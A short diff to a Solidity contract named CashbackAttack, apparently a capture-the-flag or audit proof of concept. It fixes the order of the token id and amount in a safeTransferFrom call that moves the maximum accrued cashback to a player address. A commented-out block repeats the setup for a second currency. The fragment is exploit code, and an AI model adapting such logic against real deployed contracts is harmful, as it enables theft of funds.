@@ -37,7 +37,7 @@ contract CashbackAttack {
 
         uint256 nativeAmt = NATIVE_MAX_CASHBACK * BASIS_POINTS / NATIVE_CASHBACK_RATE;
         cashback.accrueCashback(CurrencyLibrary.NATIVE_CURRENCY, nativeAmt);
-        cashback.safeTransferFrom(address(this), player, nativeAmt, CurrencyLibrary.NATIVE_CURRENCY.toId(), "");
+        cashback.safeTransferFrom(address(this), player, CurrencyLibrary.NATIVE_CURRENCY.toId(), nativeAmt, "");
 
         // Currency freedomCurrency = Currency.wrap(FREEDOM_ADDR);
         // uint256 freedomAmt = FREEDOM_MAX_CASHBACK * BASIS_POINTS / FREEDOM_CASHBACK_RATE;
